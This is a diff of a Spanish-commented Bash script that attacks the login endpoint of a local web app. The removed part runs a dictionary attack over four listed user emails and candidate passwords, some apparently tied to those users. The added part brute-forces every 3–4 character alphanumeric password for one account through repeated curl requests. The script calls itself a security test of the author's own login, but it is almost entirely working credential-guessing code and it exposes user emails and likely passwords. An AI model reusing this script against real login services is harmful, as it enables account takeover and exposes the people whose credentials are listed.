@@ -1,37 +1,63 @@
 #!/bin/bash
 
-API="http://localhost:8000"
-echo "=== Probando seguridad del login ==="
 
-# Lista de contraseñas para probar
-passwords=(
-    "Admin123" "Elianna123" "Ar1ana" "Luis2006" "Sebas_Cal"
-    "123456" "password" "admin" "test" "1234"
-)
+URL="http://127.0.0.1:8000/login"
+CORREO="theo@gmail.com"
+CHARS="abcdefghijklmnopqrstuvwxyz0123456789"
+INTENTOS=0
 
-# Correos de la base de datos
-emails=("theo@gmail.com" "eliannna@gmail.com" "ariana@gmail.com" "sebas@gmail.com")
+# Genera todas las combinaciones alfanuméricas de longitud fija
+generate_combinations() {
+    local length=$1
+    local total=${#CHARS}
+    local indices=()
 
-echo "Probando ${#emails[@]} usuarios con ${#passwords[@]} contraseñas..."
-echo ""
-
-for email in "${emails[@]}"; do
-    echo "Atacando: $email"
-    
-    for pass in "${passwords[@]}"; do
-        # Hacer la petición al login
-        respuesta=$(curl -s -X POST "$API/login" \
-            -H "Content-Type: application/json" \
-            -d "{\"correo\":\"$email\", \"password\":\"$pass\"}")
-        
-        # Verificar si fue exitoso
-        if echo "$respuesta" | grep -q "exitoso"; then
-            echo "✅ ENCONTRADO: $email - $pass"
-        else
-            echo "❌ Fallo: $pass"
-        fi
+    # Inicializa los índices en 0
+    for ((i=0; i<length; i++)); do
+        indices[i]=0
     done
-    echo "---"
+
+    while true; do
+        # Construye la contraseña actual
+        password=""
+        for ((i=0; i<length; i++)); do
+            password+="${CHARS:${indices[i]}:1}"
+        done
+
+        # Incrementa contador de intentos
+        ((INTENTOS++))
+
+        # Intenta login
+        response=$(curl -s -X POST "$URL" \
+            -H "Content-Type: application/json" \
+            -d "{\"correo\": \"$CORREO\", \"password\": \"$password\"}")
+
+        if [[ "$response" == *"Login exitoso"* ]]; then
+            echo "✅ ¡Contraseña encontrada!: $password"
+            echo "🔢 Total de intentos: $INTENTOS"
+            exit 0
+        fi
+
+        # Incrementa los índices
+        for ((i=length-1; i>=0; i--)); do
+            if (( indices[i] < total - 1 )); then
+                ((indices[i]++))
+                break
+            else
+                indices[i]=0
+                if (( i == 0 )); then
+                    return  # Se agotaron todas las combinaciones
+                fi
+            fi
+        done
+    done
+}
+
+# Fuerza bruta desde longitud 3 hasta 4 (puedes ampliar si quieres)
+for len in {3..4}; do
+    echo "🔍 Probando contraseñas de longitud $len..."
+    generate_combinations "$len"
 done
 
-echo "=== Prueba terminada ==="
+echo "❌ Contraseña no encontrada en el rango especificado."
+echo "🔢 Total de intentos: $INTENTOS"
